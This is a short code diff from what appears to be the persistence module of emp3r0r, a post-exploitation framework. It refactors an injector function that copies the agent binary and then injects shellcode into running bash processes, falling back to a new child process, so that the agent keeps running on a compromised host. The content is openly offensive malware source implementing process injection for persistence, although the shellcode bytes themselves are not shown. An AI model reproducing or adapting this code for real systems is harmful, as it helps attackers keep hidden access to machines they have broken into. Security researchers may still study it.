@@ -196,11 +196,10 @@ func AddCronJob(job string) error {
 func injector() (err error) {
 	// this shellcode forks a process and executes emp3r0r agent
 	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = Copy(os.Args[0], "[persistence_shellcode_exe]")
+	err = Copy(os.Args[0], GuardianAgentPath)
 	if err != nil {
 		return
 	}
-	shellcode := `[persistence_shellcode]`
 
 	// find some processes to inject
 	procs := PidOf("bash")
@@ -216,14 +215,14 @@ func injector() (err error) {
 				return
 			}
 			log.Printf("Injecting to %s (%d)...", ProcCmdline(pid), pid)
-			e := Injector(&shellcode, pid)
+			e := Injector(&GuardianShellcode, pid)
 			if e != nil {
 				err = fmt.Errorf("%v, %v", err, e)
 			}
 		}(pid)
 	}
 	if err != nil {
-		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&shellcode, 0))
+		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&GuardianShellcode, 0))
 	}
 
 	return
